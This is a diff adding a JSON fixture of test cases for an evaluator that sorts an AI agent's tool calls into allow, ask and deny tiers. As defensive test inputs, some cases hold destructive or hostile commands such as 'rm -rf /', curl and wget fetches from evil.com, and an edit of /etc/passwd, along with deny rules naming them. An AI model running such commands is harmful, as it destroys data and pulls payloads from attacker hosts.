@@ -1,0 +1,696 @@
+{
+  "cases": [
+    {
+      "id": "evaluate.001",
+      "from": "evaluate.test.ts: evaluate > deny-first semantics > denies when a deny rule matches, even if allow also matches",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "autonomous",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "rm -rf *",
+            "tier": "deny"
+          },
+          {
+            "tool": "Bash",
+            "pattern": "*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "rm -rf /tmp/thing",
+      "expect": "deny"
+    },
+    {
+      "id": "evaluate.002",
+      "from": "evaluate.test.ts: evaluate > deny-first semantics > denies when both deny and ask match",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "curl *",
+            "tier": "deny"
+          },
+          {
+            "tool": "Bash",
+            "pattern": "curl *",
+            "tier": "ask"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "curl https://example.com",
+      "expect": "deny"
+    },
+    {
+      "id": "evaluate.003",
+      "from": "evaluate.test.ts: evaluate > deny-first semantics > asks when ask matches and no deny matches",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "autonomous",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "curl *",
+            "tier": "ask"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "curl https://example.com",
+      "expect": "ask"
+    },
+    {
+      "id": "evaluate.004",
+      "from": "evaluate.test.ts: evaluate > deny-first semantics > allows when allow matches and no deny/ask matches",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "ls *",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "ls -la",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate.005",
+      "from": "evaluate.test.ts: evaluate > default mode fallback > allows in autonomous mode with no matching rules",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "autonomous",
+        "rules": [
+          {
+            "tool": "Edit",
+            "pattern": "*",
+            "tier": "deny"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "ls",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate.006",
+      "from": "evaluate.test.ts: evaluate > default mode fallback > denies in readonly mode with no matching rules",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "readonly"
+      },
+      "tool": "bash",
+      "input": "echo hello",
+      "expect": "deny"
+    },
+    {
+      "id": "evaluate.007",
+      "from": "evaluate.test.ts: evaluate > default mode fallback > asks in standard mode with no matching rules",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard"
+      },
+      "tool": "bash",
+      "input": "echo hello",
+      "expect": "ask"
+    },
+    {
+      "id": "evaluate.008",
+      "from": "evaluate.test.ts: evaluate > default mode fallback > asks in restricted mode with no matching rules",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "restricted"
+      },
+      "tool": "bash",
+      "input": "echo hello",
+      "expect": "ask"
+    },
+    {
+      "id": "evaluate.009",
+      "from": "evaluate.test.ts: evaluate > default mode fallback > falls back to default when no rules exist",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "autonomous"
+      },
+      "tool": "bash",
+      "input": "anything",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate.010",
+      "from": "evaluate.test.ts: evaluate > default mode fallback > defaults to ask for standard mode without rules",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard"
+      },
+      "tool": "bash",
+      "input": "anything",
+      "expect": "ask"
+    },
+    {
+      "id": "evaluate.011",
+      "from": "evaluate.test.ts: evaluate > bare tool name matching (no pattern) > matches exact tool name without pattern",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "bash",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "anything",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate.012",
+      "from": "evaluate.test.ts: evaluate > bare tool name matching (no pattern) > does not match different tool name",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "bash",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "edit",
+      "input": "/some/file",
+      "expect": "ask"
+    },
+    {
+      "id": "evaluate.013",
+      "from": "evaluate.test.ts: evaluate > bare tool name matching (no pattern) > matches case-insensitively",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "anything",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate.014",
+      "from": "evaluate.test.ts: evaluate > pattern matching — ToolName(pattern) > matches tool name with glob pattern against input",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "git *",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "git commit -m test",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate.015",
+      "from": "evaluate.test.ts: evaluate > pattern matching — ToolName(pattern) > rejects when tool name matches but pattern does not",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "git *",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "npm install",
+      "expect": "ask"
+    },
+    {
+      "id": "evaluate.016",
+      "from": "evaluate.test.ts: evaluate > pattern matching — ToolName(pattern) > absent pattern matches any input for that tool",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "anything at all",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate.017",
+      "from": "evaluate.test.ts: evaluate > domain pattern — domain:example.com > matches when input contains the domain",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "domain:evil.com",
+            "tier": "deny"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "curl https://evil.com/payload",
+      "expect": "deny"
+    },
+    {
+      "id": "evaluate.018",
+      "from": "evaluate.test.ts: evaluate > domain pattern — domain:example.com > does not match when domain is absent",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "domain:evil.com",
+            "tier": "deny"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "curl https://safe.com/page",
+      "expect": "ask"
+    },
+    {
+      "id": "evaluate.019",
+      "from": "evaluate.test.ts: evaluate > domain pattern — domain:example.com > matches domain as substring",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "domain:evil.com",
+            "tier": "deny"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "wget sub.evil.com/path",
+      "expect": "deny"
+    },
+    {
+      "id": "evaluate.020",
+      "from": "evaluate.test.ts: evaluate > prefix pattern — prefix:* > matches when input starts with prefix followed by space",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "git:*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "git status",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate.021",
+      "from": "evaluate.test.ts: evaluate > prefix pattern — prefix:* > matches when input starts with prefix followed by space",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "git:*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "git",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate.022",
+      "from": "evaluate.test.ts: evaluate > prefix pattern — prefix:* > does not match when input has different prefix",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "git:*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "npm:install",
+      "expect": "ask"
+    },
+    {
+      "id": "evaluate.023",
+      "from": "evaluate.test.ts: evaluate > glob matching in tool names > matches MCP tool prefix with wildcard",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "mcp__server__*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "mcp__server__read",
+      "input": "",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate.024",
+      "from": "evaluate.test.ts: evaluate > glob matching in tool names > matches MCP tool prefix with wildcard",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "mcp__server__*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "mcp__server__write",
+      "input": "",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate.025",
+      "from": "evaluate.test.ts: evaluate > multiple rules in same tier > checks all deny rules before moving to ask",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "autonomous",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "rm *",
+            "tier": "deny"
+          },
+          {
+            "tool": "Bash",
+            "pattern": "domain:evil.com",
+            "tier": "deny"
+          },
+          {
+            "tool": "Bash",
+            "pattern": "*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "rm -rf /",
+      "expect": "deny"
+    },
+    {
+      "id": "evaluate.026",
+      "from": "evaluate.test.ts: evaluate > multiple rules in same tier > checks all deny rules before moving to ask",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "autonomous",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "rm *",
+            "tier": "deny"
+          },
+          {
+            "tool": "Bash",
+            "pattern": "domain:evil.com",
+            "tier": "deny"
+          },
+          {
+            "tool": "Bash",
+            "pattern": "*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "curl https://evil.com/x",
+      "expect": "deny"
+    },
+    {
+      "id": "evaluate.027",
+      "from": "evaluate.test.ts: evaluate > multiple rules in same tier > checks all deny rules before moving to ask",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "autonomous",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "rm *",
+            "tier": "deny"
+          },
+          {
+            "tool": "Bash",
+            "pattern": "domain:evil.com",
+            "tier": "deny"
+          },
+          {
+            "tool": "Bash",
+            "pattern": "*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "ls -la",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate.028",
+      "from": "evaluate.test.ts: evaluate > multiple rules in same tier > checks all ask rules before moving to allow",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "autonomous",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "curl *",
+            "tier": "ask"
+          },
+          {
+            "tool": "Bash",
+            "pattern": "wget *",
+            "tier": "ask"
+          },
+          {
+            "tool": "Bash",
+            "pattern": "*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "curl https://x.com",
+      "expect": "ask"
+    },
+    {
+      "id": "evaluate.029",
+      "from": "evaluate.test.ts: evaluate > multiple rules in same tier > checks all ask rules before moving to allow",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "autonomous",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "curl *",
+            "tier": "ask"
+          },
+          {
+            "tool": "Bash",
+            "pattern": "wget *",
+            "tier": "ask"
+          },
+          {
+            "tool": "Bash",
+            "pattern": "*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "wget https://x.com",
+      "expect": "ask"
+    },
+    {
+      "id": "evaluate.030",
+      "from": "evaluate.test.ts: evaluate > multiple rules in same tier > checks all ask rules before moving to allow",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "autonomous",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "curl *",
+            "tier": "ask"
+          },
+          {
+            "tool": "Bash",
+            "pattern": "wget *",
+            "tier": "ask"
+          },
+          {
+            "tool": "Bash",
+            "pattern": "*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "ls",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate.031",
+      "from": "evaluate.test.ts: evaluate > path-based matching for file tools > matches file path patterns",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Edit",
+            "pattern": "/etc/*",
+            "tier": "deny"
+          },
+          {
+            "tool": "Edit",
+            "pattern": "*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "edit",
+      "input": "/etc/passwd",
+      "expect": "deny"
+    },
+    {
+      "id": "evaluate.032",
+      "from": "evaluate.test.ts: evaluate > path-based matching for file tools > matches file path patterns",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Edit",
+            "pattern": "/etc/*",
+            "tier": "deny"
+          },
+          {
+            "tool": "Edit",
+            "pattern": "*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "edit",
+      "input": "/home/user/file.ts",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate.033",
+      "from": "evaluate.test.ts: evaluate > path-based matching for file tools > matches read tool path patterns",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Read",
+            "pattern": "src/*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "read",
+      "input": "src/index.ts",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate.034",
+      "from": "evaluate.test.ts: evaluate > path-based matching for file tools > matches read tool path patterns",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Read",
+            "pattern": "src/*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "read",
+      "input": "dist/index.js",
+      "expect": "ask"
+    },
+    {
+      "id": "evaluate.035",
+      "from": "evaluate.test.ts: evaluate > edge cases > handles empty rules array",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "autonomous",
+        "rules": []
+      },
+      "tool": "bash",
+      "input": "anything",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate.036",
+      "from": "evaluate.test.ts: evaluate > edge cases > handles no rules field",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard"
+      },
+      "tool": "bash",
+      "input": "anything",
+      "expect": "ask"
+    },
+    {
+      "id": "evaluate.037",
+      "from": "evaluate.test.ts: evaluate > edge cases > handles special regex characters in patterns",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "+$[]{}",
+            "tier": "deny"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "+$[]{}",
+      "expect": "deny"
+    }
+  ]
+}
